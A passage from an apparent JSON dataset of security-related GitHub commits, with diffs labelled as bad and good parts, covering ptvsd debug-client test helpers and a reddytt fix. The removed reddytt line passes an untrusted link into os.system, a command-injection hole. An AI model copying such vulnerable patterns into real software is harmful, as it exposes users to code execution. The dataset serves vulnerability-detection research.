args.nodebug:\n            args.address = Address.as_client(clienthost, ns.pop('port'))\n        else:\n            args.address = Address.as_server(clienthost, ns.pop('port'))\n    else:\n        args.address = Address.as_client(clienthost, ns.pop('port'))\n\n    module = ns.pop('module')\n    filename = ns.pop('filename')\n    if module is None:\n        args.name = filename\n        args.kind = 'script'\n    else:\n        args.name = module\n        args.kind = 'module'\n    #if argv[-1] != args.name or (module and argv[-1] != '-m'):\n    #    parser.error('script/module must be last arg')\n\n    return args\n\n\ndef main(addr, name, kind, extra=(), nodebug=False, **kwargs):\n    if nodebug:\n        run_main(addr, name, kind, *extra, **kwargs)\n    else:\n        debug_main(addr, name, kind, *extra, **kwargs)\n\n\nif __name__ == '__main__':\n    args, extra = parse_args()\n    main(args.address, args.name, args.kind, extra, nodebug=args.nodebug,\n         singlesession=args.single_session)\n"}, "/tests/helpers/debugclient.py": {"changes": [{"diff": "\n         if wait_for_connect:\n             wait_for_connect()\n         else:\n-            wait_for_socket_server(addr)\n+            try:\n+                wait_for_socket_server(addr)\n+            except Exception:\n+                # If we fail to connect, print out the adapter output.\n+                self._adapter.VERBOSE = True\n+                raise\n             self._attach(addr, **kwargs)\n \n     def _attach(self, addr, **kwargs):\n", "add": 6, "remove": 1, "filename": "/tests/helpers/debugclient.py", "badparts": ["            wait_for_socket_server(addr)"], "goodparts": ["            try:", "                wait_for_socket_server(addr)", "            except Exception:", "                self._adapter.VERBOSE = True", "                raise"]}], "source": "\nfrom __future__ import absolute_import import os import traceback import warnings from ptvsd.socket import Address from ptvsd._util import new_hidden_thread, Closeable, ClosedError from.debugadapter import DebugAdapter, wait_for_socket_server from.debugsession import DebugSession class _LifecycleClient(Closeable): SESSION=DebugSession def __init__( self, addr=None, port=8888, breakpoints=None, connecttimeout=1.0, ): super(_LifecycleClient, self).__init__() self._addr=Address.from_raw(addr, defaultport=port) self._connecttimeout=connecttimeout self._adapter=None self._session=None self._breakpoints=breakpoints @property def adapter(self): return self._adapter @property def session(self): return self._session def start_debugging(self, launchcfg): if self.closed: raise RuntimeError('debug client closed') if self._adapter is not None: raise RuntimeError('debugger already running') assert self._session is None raise NotImplementedError def stop_debugging(self): if self.closed: raise RuntimeError('debug client closed') if self._adapter is None: raise RuntimeError('debugger not running') if self._session is not None: self._detach() try: self._adapter.close() except ClosedError: pass self._adapter=None def attach_pid(self, pid, **kwargs): if self.closed: raise RuntimeError('debug client closed') if self._adapter is None: raise RuntimeError('debugger not running') if self._session is not None: raise RuntimeError('already attached') raise NotImplementedError def attach_socket(self, addr=None, adapter=None, **kwargs): if self.closed: raise RuntimeError('debug client closed') if adapter is None: adapter=self._adapter elif self._adapter is not None: raise RuntimeError('already using managed adapter') if adapter is None: raise RuntimeError('debugger not running') if self._session is not None: raise RuntimeError('already attached') if addr is None: addr=adapter.address self._attach(addr, **kwargs) return self._session def detach(self, adapter=None): if self.closed: raise RuntimeError('debug client closed') if self._session is None: raise RuntimeError('not attached') if adapter is None: adapter=self._adapter assert adapter is not None if not self._session.is_client: raise RuntimeError('detach not supported') self._detach() def _close(self): if self._session is not None: try: self._session.close() except ClosedError: pass if self._adapter is not None: try: self._adapter.close() except ClosedError: pass def _launch(self, argv, script=None, wait_for_connect=None, detachable=True, env=None, cwd=None, **kwargs): if script is not None: def start(*args, **kwargs): return DebugAdapter.start_wrapper_script( script, *args, **kwargs) else: start=DebugAdapter.start new_addr=Address.as_server if detachable else Address.as_client addr=new_addr(None, self._addr.port) self._adapter=start(argv, addr=addr, env=env, cwd=cwd) if wait_for_connect: wait_for_connect() else: wait_for_socket_server(addr) self._attach(addr, **kwargs) def _attach(self, addr, **kwargs): if addr is None: addr=self._addr assert addr.host=='localhost' self._session=self.SESSION.create_client(addr, **kwargs) def _detach(self): session=self._session if session is None: return self._session=None try: session.close() except ClosedError: pass class DebugClient(_LifecycleClient): \"\"\"A high-level abstraction of a debug client(i.e. editor).\"\"\" class EasyDebugClient(DebugClient): def start_detached(self, argv): \"\"\"Start an adapter in a background process.\"\"\" if self.closed: raise RuntimeError('debug client closed') if self._adapter is not None: raise RuntimeError('debugger already running') assert self._session is None self._adapter=DebugAdapter.start(argv, port=self._port) return self._adapter def host_local_debugger(self, argv, script=None, env=None, cwd=None, **kwargs): if self.closed: raise RuntimeError('debug client closed') if self._adapter is not None: raise RuntimeError('debugger already running') assert self._session is None addr=('localhost', self._addr.port) self._run_server_ex=None def run(): try: self._session=self.SESSION.create_server(addr, **kwargs) except Exception as ex: self._run_server_ex=traceback.format_exc() t=new_hidden_thread( target=run, name='test.client', ) t.start() def wait(): t.join(timeout=self._connecttimeout) if t.is_alive(): warnings.warn('timed out waiting for connection') if self._session is None: message='unable to connect after{} secs'.format( self._connecttimeout) if self._run_server_ex is None: raise Exception(message) else: message=message +os.linesep +self._run_server_ex raise Exception(message) self._launch( argv, script=script, wait_for_connect=wait, detachable=False, env=env, cwd=cwd) return self._adapter, self._session def launch_script(self, filename, *argv, **kwargs): if self.closed: raise RuntimeError('debug client closed') if self._adapter is not None: raise RuntimeError('debugger already running') assert self._session is None argv=[ filename, ] +list(argv) if kwargs.pop('nodebug', False): argv.insert(0, '--nodebug') self._launch(argv, **kwargs) return self._adapter, self._session def launch_module(self, module, *argv, **kwargs): if self.closed: raise RuntimeError('debug client closed') if self._adapter is not None: raise RuntimeError('debugger already running') assert self._session is None argv=[ '-m', module, ] +list(argv) if kwargs.pop('nodebug', False): argv.insert(0, '--nodebug') self._launch(argv, **kwargs) return self._adapter, self._session ", "sourceWithComments": "from __future__ import absolute_import\n\nimport os\nimport traceback\nimport warnings\n\nfrom ptvsd.socket import Address\nfrom ptvsd._util import new_hidden_thread, Closeable, ClosedError\nfrom .debugadapter import DebugAdapter, wait_for_socket_server\nfrom .debugsession import DebugSession\n\n# TODO: Add a helper function to start a remote debugger for testing\n# remote debugging?\n\n\nclass _LifecycleClient(Closeable):\n\n    SESSION = DebugSession\n\n    def __init__(\n            self,\n            addr=None,\n            port=8888,\n            breakpoints=None,\n            connecttimeout=1.0,\n    ):\n        super(_LifecycleClient, self).__init__()\n        self._addr = Address.from_raw(addr, defaultport=port)\n        self._connecttimeout = connecttimeout\n        self._adapter = None\n        self._session = None\n\n        self._breakpoints = breakpoints\n\n    @property\n    def adapter(self):\n        return self._adapter\n\n    @property\n    def session(self):\n        return self._session\n\n    def start_debugging(self, launchcfg):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is not None:\n            raise RuntimeError('debugger already running')\n        assert self._session is None\n\n        raise NotImplementedError\n\n    def stop_debugging(self):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is None:\n            raise RuntimeError('debugger not running')\n\n        if self._session is not None:\n            self._detach()\n\n        try:\n            self._adapter.close()\n        except ClosedError:\n            pass\n        self._adapter = None\n\n    def attach_pid(self, pid, **kwargs):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is None:\n            raise RuntimeError('debugger not running')\n        if self._session is not None:\n            raise RuntimeError('already attached')\n\n        raise NotImplementedError\n\n    def attach_socket(self, addr=None, adapter=None, **kwargs):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if adapter is None:\n            adapter = self._adapter\n        elif self._adapter is not None:\n            raise RuntimeError('already using managed adapter')\n        if adapter is None:\n            raise RuntimeError('debugger not running')\n        if self._session is not None:\n            raise RuntimeError('already attached')\n\n        if addr is None:\n            addr = adapter.address\n        self._attach(addr, **kwargs)\n        return self._session\n\n    def detach(self, adapter=None):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._session is None:\n            raise RuntimeError('not attached')\n        if adapter is None:\n            adapter = self._adapter\n        assert adapter is not None\n        if not self._session.is_client:\n            raise RuntimeError('detach not supported')\n\n        self._detach()\n\n    # internal methods\n\n    def _close(self):\n        if self._session is not None:\n            try:\n                self._session.close()\n            except ClosedError:\n                pass\n        if self._adapter is not None:\n            try:\n                self._adapter.close()\n            except ClosedError:\n                pass\n\n    def _launch(self,\n                argv,\n                script=None,\n                wait_for_connect=None,\n                detachable=True,\n                env=None,\n                cwd=None,\n                **kwargs):\n        if script is not None:\n            def start(*args, **kwargs):\n                return DebugAdapter.start_wrapper_script(\n                    script, *args, **kwargs)\n        else:\n            start = DebugAdapter.start\n        new_addr = Address.as_server if detachable else Address.as_client\n        addr = new_addr(None, self._addr.port)\n        self._adapter = start(argv, addr=addr, env=env, cwd=cwd)\n\n        if wait_for_connect:\n            wait_for_connect()\n        else:\n            wait_for_socket_server(addr)\n            self._attach(addr, **kwargs)\n\n    def _attach(self, addr, **kwargs):\n        if addr is None:\n            addr = self._addr\n        assert addr.host == 'localhost'\n        self._session = self.SESSION.create_client(addr, **kwargs)\n\n    def _detach(self):\n        session = self._session\n        if session is None:\n            return\n        self._session = None\n        try:\n            session.close()\n        except ClosedError:\n            pass\n\n\nclass DebugClient(_LifecycleClient):\n    \"\"\"A high-level abstraction of a debug client (i.e. editor).\"\"\"\n\n    # TODO: Manage breakpoints, etc.\n    # TODO: Add debugger methods here (e.g. \"pause\").\n\n\nclass EasyDebugClient(DebugClient):\n    def start_detached(self, argv):\n        \"\"\"Start an adapter in a background process.\"\"\"\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is not None:\n            raise RuntimeError('debugger already running')\n        assert self._session is None\n\n        # TODO: Launch, handshake and detach?\n        self._adapter = DebugAdapter.start(argv, port=self._port)\n        return self._adapter\n\n    def host_local_debugger(self,\n                            argv,\n                            script=None,\n                            env=None,\n                            cwd=None,\n                            **kwargs):  # noqa\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is not None:\n            raise RuntimeError('debugger already running')\n        assert self._session is None\n        addr = ('localhost', self._addr.port)\n\n        self._run_server_ex = None\n\n        def run():\n            try:\n                self._session = self.SESSION.create_server(addr, **kwargs)\n            except Exception as ex:\n                self._run_server_ex = traceback.format_exc()\n\n        t = new_hidden_thread(\n            target=run,\n            name='test.client',\n        )\n        t.start()\n\n        def wait():\n            t.join(timeout=self._connecttimeout)\n            if t.is_alive():\n                warnings.warn('timed out waiting for connection')\n            if self._session is None:\n                message = 'unable to connect after {} secs'.format(  # noqa\n                    self._connecttimeout)\n                if self._run_server_ex is None:\n                    raise Exception(message)\n                else:\n                    message = message + os.linesep + self._run_server_ex # noqa\n                    raise Exception(message)\n\n            # The adapter will close when the connection does.\n\n        self._launch(\n            argv,\n            script=script,\n            wait_for_connect=wait,\n            detachable=False,\n            env=env,\n            cwd=cwd)\n\n        return self._adapter, self._session\n\n    def launch_script(self, filename, *argv, **kwargs):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is not None:\n            raise RuntimeError('debugger already running')\n        assert self._session is None\n\n        argv = [\n            filename,\n        ] + list(argv)\n        if kwargs.pop('nodebug', False):\n            argv.insert(0, '--nodebug')\n        self._launch(argv, **kwargs)\n        return self._adapter, self._session\n\n    def launch_module(self, module, *argv, **kwargs):\n        if self.closed:\n            raise RuntimeError('debug client closed')\n        if self._adapter is not None:\n            raise RuntimeError('debugger already running')\n        assert self._session is None\n\n        argv = [\n            '-m',\n            module,\n        ] + list(argv)\n        if kwargs.pop('nodebug', False):\n            argv.insert(0, '--nodebug')\n        self._launch(argv, **kwargs)\n        return self._adapter, self._session\n"}, "/tests/helpers/debugsession.py": {"changes": [{"diff": "\n         self._check_handlers()\n \n     def _listen(self):\n+        eof = None\n         try:\n             for msg in self._conn.iter_messages():\n                 if self.VERBOSE:\n                     print(' ->', msg)\n                 self._receive_message(msg)\n-        except EOFError:\n+        except EOFError as ex:\n+            # Handle EOF outside of except to avoid unnecessary chaining.\n+            eof = ex\n+        if eof:\n+            remainder = getattr(eof, 'remainder', b'')\n+            if remainder:\n+                self._receive_message(remainder)\n             try:\n                 self.close()\n             except C", "add": 8, "remove": 1, "filename": "/tests/helpers/debugsession.py", "badparts": ["        except EOFError:"], "goodparts": ["        eof = None", "        except EOFError as ex:", "            eof = ex", "        if eof:", "            remainder = getattr(eof, 'remainder', b'')", "            if remainder:", "                self._receive_message(remainder)"]}], "source": "\nfrom __future__ import absolute_import, print_function import contextlib import json import socket import sys import time import threading import warnings from ptvsd._util import new_hidden_thread, Closeable, ClosedError from.message import( raw_read_all as read_messages, raw_write_one as write_message ) from.socket import( Connection, create_server, create_client, close, recv_as_read, send_as_write, timeout as socket_timeout) from.threading import get_locked_and_waiter from.vsc import parse_message class DebugSessionConnection(Closeable): VERBOSE=False TIMEOUT=5.0 @classmethod def create_client(cls, addr, **kwargs): def connect(addr, timeout): sock=create_client() for _ in range(int(timeout * 10)): try: sock.connect(addr) except(OSError, socket.error): if cls.VERBOSE: print('+', end='') sys.stdout.flush() time.sleep(0.1) else: break else: raise RuntimeError('could not connect') return sock return cls._create(connect, addr, **kwargs) @classmethod def create_server(cls, addr, **kwargs): def connect(addr, timeout): server=create_server(addr) with socket_timeout(server, timeout): client, _=server.accept() return Connection(client, server) return cls._create(connect, addr, **kwargs) @classmethod def _create(cls, connect, addr, timeout=None): if timeout is None: timeout=cls.TIMEOUT sock=connect(addr, timeout) if cls.VERBOSE: print('connected') self=cls(sock, ownsock=True) self._addr=addr return self def __init__(self, sock, ownsock=False): super(DebugSessionConnection, self).__init__() self._sock=sock self._ownsock=ownsock @property def is_client(self): try: return self._sock.server is None except AttributeError: return True def iter_messages(self): if self.closed: raise RuntimeError('connection closed') def stop(): return self.closed read=recv_as_read(self._sock) for msg, _, _ in read_messages(read, stop=stop): if self.VERBOSE: print(repr(msg)) yield parse_message(msg) def send(self, req): if self.closed: raise RuntimeError('connection closed') def stop(): return self.closed write=send_as_write(self._sock) body=json.dumps(req) write_message(write, body, stop=stop) def _close(self): if self._ownsock: close(self._sock) class DebugSession(Closeable): VERBOSE=False HOST='localhost' PORT=8888 TIMEOUT=None @classmethod def create_client(cls, addr=None, **kwargs): if addr is None: addr=(cls.HOST, cls.PORT) conn=DebugSessionConnection.create_client( addr, timeout=kwargs.get('timeout'), ) return cls(conn, owned=True, **kwargs) @classmethod def create_server(cls, addr=None, **kwargs): if addr is None: addr=(cls.HOST, cls.PORT) conn=DebugSessionConnection.create_server(addr, **kwargs) return cls(conn, owned=True, **kwargs) def __init__(self, conn, seq=1000, handlers=(), timeout=None, owned=False): super(DebugSession, self).__init__() self._conn=conn self._seq=seq self._timeout=timeout self._owned=owned self._handlers=[] for handler in handlers: if callable(handler): self._add_handler(handler) else: self._add_handler(*handler) self._received=[] self._listenerthread=new_hidden_thread( target=self._listen, name='test.session', ) self._listenerthread.start() @property def is_client(self): return self._conn.is_client @property def received(self): return list(self._received) def _create_request(self, command, **args): seq=self._seq self._seq +=1 return{ 'type': 'request', 'seq': seq, 'command': command, 'arguments': args, } def send_request(self, command, **args): if self.closed: raise RuntimeError('session closed') wait=args.pop('wait', False) req=self._create_request(command, **args) if self.VERBOSE: msg=parse_message(req) print(' <-', msg) if wait: with self.wait_for_response(req) as resp: self._conn.send(req) resp_awaiter=AwaitableResponse(req, lambda: resp[\"msg\"]) else: resp_awaiter=self._get_awaiter_for_request(req, **args) self._conn.send(req) return resp_awaiter def add_handler(self, handler, **kwargs): if self.closed: raise RuntimeError('session closed') self._add_handler(handler, **kwargs) @contextlib.contextmanager def wait_for_event(self, event, **kwargs): if self.closed: raise RuntimeError('session closed') result={'msg': None} def match(msg): result['msg']=msg return msg.type=='event' and msg.event==event handlername='event{!r}'.format(event) with self._wait_for_message(match, handlername, **kwargs): yield result def get_awaiter_for_event(self, event, condition=lambda msg: True, **kwargs): if self.closed: raise RuntimeError('session closed') result={'msg': None} def match(msg): result['msg']=msg return msg.type=='event' and msg.event==event and condition(msg) handlername='event{!r}'.format(event) evt=self._get_message_handle(match, handlername) return AwaitableEvent(event, lambda: result[\"msg\"], evt) def _get_awaiter_for_request(self, req, **kwargs): if self.closed: raise RuntimeError('session closed') try: command, seq=req.command, req.seq except AttributeError: command, seq=req['command'], req['seq'] result={'msg': None} def match(msg): if msg.type !='response': return False result['msg']=msg return msg.request_seq==seq handlername='response(cmd:{} seq:{})'.format(command, seq) evt=self._get_message_handle(match, handlername) return AwaitableResponse(req, lambda: result[\"msg\"], evt) @contextlib.contextmanager def wait_for_response(self, req, **kwargs): if self.closed: raise RuntimeError('session closed') try: command, seq=req.command, req.seq except AttributeError: command, seq=req['command'], req['seq'] result={'msg': None} def match(msg): if msg.type !='response': return False result['msg']=msg return msg.request_seq==seq handlername='response(cmd:{} seq:{})'.format(command, seq) with self._wait_for_message(match, handlername, **kwargs): yield result def _close(self): if self._owned: try: self._conn.close() except ClosedError: pass if self._listenerthread !=threading.current_thread(): self._listenerthread.join(timeout=1.0) if self._listenerthread.is_alive(): warnings.warn('session listener still running') self._check_handlers() def _listen(self): try: for msg in self._conn.iter_messages(): if self.VERBOSE: print(' ->', msg) self._receive_message(msg) except EOFError: try: self.close() except ClosedError: pass def _receive_message(self, msg): for i, handler in enumerate(list(self._handlers)): handle_message, _, _=handler handled=handle_message(msg) try: msg, handled=handled except TypeError: pass if handled: self._handlers.remove(handler) break self._received.append(msg) def _add_handler(self, handle_msg, handlername=None, required=True): self._handlers.append( (handle_msg, handlername, required)) def _check_handlers(self): unhandled=[] for handle_msg, name, required in self._handlers: if not required: continue unhandled.append(name or repr(handle_msg)) if unhandled: raise RuntimeError('unhandled:{}'.format(unhandled)) @contextlib.contextmanager def _wait_for_message(self, match, handlername, timeout=None): if timeout is None: timeout=self.TIMEOUT lock, wait=get_locked_and_waiter() def handler(msg): if not match(msg): return msg, False lock.release() return msg, True self._add_handler(handler, handlername) try: yield finally: wait(timeout or self._timeout, handlername, fail=True) def _get_message_handle(self, match, handlername): event=threading.Event() def handler(msg): if not match(msg): return msg, False event.set() return msg, True self._add_handler(handler, handlername, False) return event class Awaitable(object): @classmethod def wait_all(cls, *awaitables): timeout=3.0 messages=[] for _ in range(int(timeout * 10)): time.sleep(0.1) messages=[] not_ready=(a for a in awaitables if a._event is not None and not a._event.is_set()) for awaitable in not_ready: if isinstance(awaitable, AwaitableEvent): messages.append('Event{}'.format(awaitable.name)) else: messages.append('Response{}'.format(awaitable.name)) if len(messages)==0: return else: raise TimeoutError('Timeout waiting for{}'.format(','.join(messages))) def __init__(self, name, event=None): self._event=event self.name=name def wait(self, timeout=1.0): if self._event is None: return if not self._event.wait(timeout): message='Timeout waiting for ' if isinstance(self, AwaitableEvent): message +='Event{}'.format(self.name) else: message +='Response{}'.format(self.name) raise TimeoutError(message) class AwaitableResponse(Awaitable): def __init__(self, req, result_getter, event=None): super(AwaitableResponse, self).__init__(req[\"command\"], event) self.req=req self._result_getter=result_getter @property def resp(self): return self._result_getter() class AwaitableEvent(Awaitable): def __init__(self, name, result_getter, event=None): super(AwaitableEvent, self).__init__(name, event) self._result_getter=result_getter @property def event(self): return self._result_getter() ", "sourceWithComments": "from __future__ import absolute_import, print_function\n\nimport contextlib\nimport json\nimport socket\nimport sys\nimport time\nimport threading\nimport warnings\n\nfrom ptvsd._util import new_hidden_thread, Closeable, ClosedError\nfrom .message import (\n    raw_read_all as read_messages,\n    raw_write_one as write_message\n)\nfrom .socket import (\n    Connection, create_server, create_client, close,\n    recv_as_read, send_as_write,\n    timeout as socket_timeout)\nfrom .threading import get_locked_and_waiter\nfrom .vsc import parse_message\n\n\nclass DebugSessionConnection(Closeable):\n\n    VERBOSE = False\n    #VERBOSE = True\n\n    TIMEOUT = 5.0\n\n    @classmethod\n    def create_client(cls, addr, **kwargs):\n        def connect(addr, timeout):\n            sock = create_client()\n            for _ in range(int(timeout * 10)):\n                try:\n                    sock.connect(addr)\n                except (OSError, socket.error):\n                    if cls.VERBOSE:\n                        print('+', end='')\n                        sys.stdout.flush()\n                    time.sleep(0.1)\n                else:\n                    break\n            else:\n                raise RuntimeError('could not connect')\n            return sock\n        return cls._create(connect, addr, **kwargs)\n\n    @classmethod\n    def create_server(cls, addr, **kwargs):\n        def connect(addr, timeout):\n            server = create_server(addr)\n            with socket_timeout(server, timeout):\n                client, _ = server.accept()\n            return Connection(client, server)\n        return cls._create(connect, addr, **kwargs)\n\n    @classmethod\n    def _create(cls, connect, addr, timeout=None):\n        if timeout is None:\n            timeout = cls.TIMEOUT\n        sock = connect(addr, timeout)\n        if cls.VERBOSE:\n            print('connected')\n        self = cls(sock, ownsock=True)\n        self._addr = addr\n        return self\n\n    def __init__(self, sock, ownsock=False):\n        super(DebugSessionConnection, self).__init__()\n        self._sock = sock\n        self._ownsock = ownsock\n\n    @property\n    def is_client(self):\n        try:\n            return self._sock.server is None\n        except AttributeError:\n            return True\n\n    def iter_messages(self):\n        if self.closed:\n            raise RuntimeError('connection closed')\n\n        def stop():\n            return self.closed\n        read = recv_as_read(self._sock)\n        for msg, _, _ in read_messages(read, stop=stop):\n            if self.VERBOSE:\n                print(repr(msg))\n            yield parse_message(msg)\n\n    def send(self, req):\n        if self.closed:\n            raise RuntimeError('connection closed')\n\n        def stop():\n            return self.closed\n        write = send_as_write(self._sock)\n        body = json.dumps(req)\n        write_message(write, body, stop=stop)\n\n    # internal methods\n\n    def _close(self):\n        if self._ownsock:\n            close(self._sock)\n\n\nclass DebugSession(Closeable):\n\n    VERBOSE = False\n    #VERBOSE = True\n\n    HOST = 'localhost'\n    PORT = 8888\n\n    TIMEOUT = None\n\n    @classmethod\n    def create_client(cls, addr=None, **kwargs):\n        if addr is None:\n            addr = (cls.HOST, cls.PORT)\n        conn = DebugSessionConnection.create_client(\n            addr,\n            timeout=kwargs.get('timeout'),\n        )\n        return cls(conn, owned=True, **kwargs)\n\n    @classmethod\n    def create_server(cls, addr=None, **kwargs):\n        if addr is None:\n            addr = (cls.HOST, cls.PORT)\n        conn = DebugSessionConnection.create_server(addr, **kwargs)\n        return cls(conn, owned=True, **kwargs)\n\n    def __init__(self, conn, seq=1000, handlers=(), timeout=None, owned=False):\n        super(DebugSession, self).__init__()\n        self._conn = conn\n        self._seq = seq\n        self._timeout = timeout\n        self._owned = owned\n\n        self._handlers = []\n        for handler in handlers:\n            if callable(handler):\n                self._add_handler(handler)\n            else:\n                self._add_handler(*handler)\n        self._received = []\n        self._listenerthread = new_hidden_thread(\n            target=self._listen,\n            name='test.session',\n        )\n        self._listenerthread.start()\n\n    @property\n    def is_client(self):\n        return self._conn.is_client\n\n    @property\n    def received(self):\n        return list(self._received)\n\n    def _create_request(self, command, **args):\n        seq = self._seq\n        self._seq += 1\n        return {\n            'type': 'request',\n            'seq': seq,\n            'command': command,\n            'arguments': args,\n        }\n\n    def send_request(self, command, **args):\n        if self.closed:\n            raise RuntimeError('session closed')\n\n        wait = args.pop('wait', False)\n        req = self._create_request(command, **args)\n        if self.VERBOSE:\n            msg = parse_message(req)\n            print(' <-', msg)\n\n        if wait:\n            with self.wait_for_response(req) as resp:\n                self._conn.send(req)\n            resp_awaiter = AwaitableResponse(req, lambda: resp[\"msg\"])\n        else:\n            resp_awaiter = self._get_awaiter_for_request(req, **args)\n            self._conn.send(req)\n        return resp_awaiter\n\n    def add_handler(self, handler, **kwargs):\n        if self.closed:\n            raise RuntimeError('session closed')\n\n        self._add_handler(handler, **kwargs)\n\n    @contextlib.contextmanager\n    def wait_for_event(self, event, **kwargs):\n        if self.closed:\n            raise RuntimeError('session closed')\n        result = {'msg': None}\n\n        def match(msg):\n            result['msg'] = msg\n            return msg.type == 'event' and msg.event == event\n        handlername = 'event {!r}'.format(event)\n        with self._wait_for_message(match, handlername, **kwargs):\n            yield result\n\n    def get_awaiter_for_event(self, event, condition=lambda msg: True, **kwargs): # noqa\n        if self.closed:\n            raise RuntimeError('session closed')\n        result = {'msg': None}\n\n        def match(msg):\n            result['msg'] = msg\n            return msg.type == 'event' and msg.event == event and condition(msg) # noqa\n        handlername = 'event {!r}'.format(event)\n        evt = self._get_message_handle(match, handlername)\n\n        return AwaitableEvent(event, lambda: result[\"msg\"], evt)\n\n    def _get_awaiter_for_request(self, req, **kwargs):\n        if self.closed:\n            raise RuntimeError('session closed')\n\n        try:\n            command, seq = req.command, req.seq\n        except AttributeError:\n            command, seq = req['command'], req['seq']\n        result = {'msg': None}\n\n        def match(msg):\n            if msg.type != 'response':\n                return False\n            result['msg'] = msg\n            return msg.request_seq == seq\n        handlername = 'response (cmd:{} seq:{})'.format(command, seq)\n        evt = self._get_message_handle(match, handlername)\n\n        return AwaitableResponse(req, lambda: result[\"msg\"], evt)\n\n    @contextlib.contextmanager\n    def wait_for_response(self, req, **kwargs):\n        if self.closed:\n            raise RuntimeError('session closed')\n\n        try:\n            command, seq = req.command, req.seq\n        except AttributeError:\n            command, seq = req['command'], req['seq']\n        result = {'msg': None}\n\n        def match(msg):\n            if msg.type != 'response':\n                return False\n            result['msg'] = msg\n            return msg.request_seq == seq\n        handlername = 'response (cmd:{} seq:{})'.format(command, seq)\n        with self._wait_for_message(match, handlername, **kwargs):\n            yield result\n\n    # internal methods\n\n    def _close(self):\n        if self._owned:\n            try:\n                self._conn.close()\n            except ClosedError:\n                pass\n        if self._listenerthread != threading.current_thread():\n            self._listenerthread.join(timeout=1.0)\n            if self._listenerthread.is_alive():\n                warnings.warn('session listener still running')\n        self._check_handlers()\n\n    def _listen(self):\n        try:\n            for msg in self._conn.iter_messages():\n                if self.VERBOSE:\n                    print(' ->', msg)\n                self._receive_message(msg)\n        except EOFError:\n            try:\n                self.close()\n            except ClosedError:\n                pass\n\n    def _receive_message(self, msg):\n        for i, handler in enumerate(list(self._handlers)):\n            handle_message, _, _ = handler\n            handled = handle_message(msg)\n            try:\n                msg, handled = handled\n            except TypeError:\n                pass\n            if handled:\n                self._handlers.remove(handler)\n                break\n        self._received.append(msg)\n\n    def _add_handler(self, handle_msg, handlername=None, required=True):\n        self._handlers.append(\n            (handle_msg, handlername, required))\n\n    def _check_handlers(self):\n        unhandled = []\n        for handle_msg, name, required in self._handlers:\n            if not required:\n                continue\n            unhandled.append(name or repr(handle_msg))\n        if unhandled:\n            raise RuntimeError('unhandled: {}'.format(unhandled))\n\n    @contextlib.contextmanager\n    def _wait_for_message(self, match, handlername, timeout=None):\n        if timeout is None:\n            timeout = self.TIMEOUT\n        lock, wait = get_locked_and_waiter()\n\n        def handler(msg):\n            if not match(msg):\n                return msg, False\n            lock.release()\n            return msg, True\n        self._add_handler(handler, handlername)\n        try:\n            yield\n        finally:\n            wait(timeout or self._timeout, handlername, fail=True)\n\n    def _get_message_handle(self, match, handlername):\n        event = threading.Event()\n\n        def handler(msg):\n            if not match(msg):\n                return msg, False\n            event.set()\n            return msg, True\n        self._add_handler(handler, handlername, False)\n        return event\n\n\nclass Awaitable(object):\n\n    @classmethod\n    def wait_all(cls, *awaitables):\n        timeout = 3.0\n        messages = []\n        for _ in range(int(timeout * 10)):\n            time.sleep(0.1)\n            messages = []\n            not_ready = (a for a in awaitables if a._event is not None and not a._event.is_set()) # noqa\n            for awaitable in not_ready:\n                if isinstance(awaitable, AwaitableEvent):\n                    messages.append('Event {}'.format(awaitable.name))\n                else:\n                    messages.append('Response {}'.format(awaitable.name))\n            if len(messages) == 0:\n                return\n        else:\n            raise TimeoutError('Timeout waiting for {}'.format(','.join(messages))) # noqa\n\n    def __init__(self, name, event=None):\n        self._event = event\n        self.name = name\n\n    def wait(self, timeout=1.0):\n        if self._event is None:\n            return\n        if not self._event.wait(timeout):\n            message = 'Timeout waiting for '\n            if isinstance(self, AwaitableEvent):\n                message += 'Event {}'.format(self.name)\n            else:\n                message += 'Response {}'.format(self.name)\n            raise TimeoutError(message)\n\n\nclass AwaitableResponse(Awaitable):\n\n    def __init__(self, req, result_getter, event=None):\n        super(AwaitableResponse, self).__init__(req[\"command\"], event)\n        self.req = req\n        self._result_getter = result_getter\n\n    @property\n    def resp(self):\n        return self._result_getter()\n\n\nclass AwaitableEvent(Awaitable):\n\n    def __init__(self, name, result_getter, event=None):\n        super(AwaitableEvent, self).__init__(name, event)\n        self._result_getter = result_getter\n\n    @property\n    def event(self):\n        return self._result_getter()\n"}}, "msg": "Fix #355: Add 'remote launch' - launch a program for remote debugging but continue running the user code (#769)\n\n* Fix #355: Add 'remote launch' - launch a program for remote debugging but continue running the user code\r\n\r\nAdd --wait command line argument, and don't block code execution if it is not specified.\r\n\r\n* Add copyright headers."}}, "https://github.com/johanbluecreek/reddytt": {"bd037e882d675ea27b96d41faf0deeac6563695c": {"url": "https://api.github.com/repos/johanbluecreek/reddytt/commits/bd037e882d675ea27b96d41faf0deeac6563695c", "html_url": "https://github.com/johanbluecreek/reddytt/commit/bd037e882d675ea27b96d41faf0deeac6563695c", "sha": "bd037e882d675ea27b96d41faf0deeac6563695c", "keyword": "remote code execution issue", "diff": "diff --git a/reddytt.py b/reddytt.py\nindex bf5885a..2a1a668 100755\n--- a/reddytt.py\n+++ b/reddytt.py\n@@ -10,6 +10,7 @@\n import urllib3\n import certifi\n import re\n+import subprocess\n import sys\n import argparse as ap\n #from argparse import ArgumentParser, REMINDER\n@@ -58,7 +59,6 @@ def getytlinks(link):\n \n     subreddit = args.subreddit\n     depth = args.depth\n-    mpv = \" \".join(args.mpv)\n \n     subreddit_link = \"https://reddit.com/r/\" + subreddit\n \n@@ -123,14 +123,15 @@ def getytlinks(link):\n         if link in seen_links:\n             print(\"Reddytt: Link seen. Skipping.\")\n         else:\n-            x = os.system(\"mpv %(args)s %(link)s\" % {\"link\": link, \"args\": mpv})\n+            p = subprocess.Popen(['mpv', link] + args.mpv, shell=False)\n+            p.communicate()\n             print(\"Reddytt: That was: %s\" % link)\n-            if x == 0:\n+            if p.returncode == 0:\n                 # The video finished or you hit 'q' (or whatever your binding is), this is a good exit.\n                 # Store the video in seen_links.\n                 seen_links.append(link)\n                 save_links.remove(link)\n-            elif x == 1024:\n+            elif p.returncode == 4:\n                 # 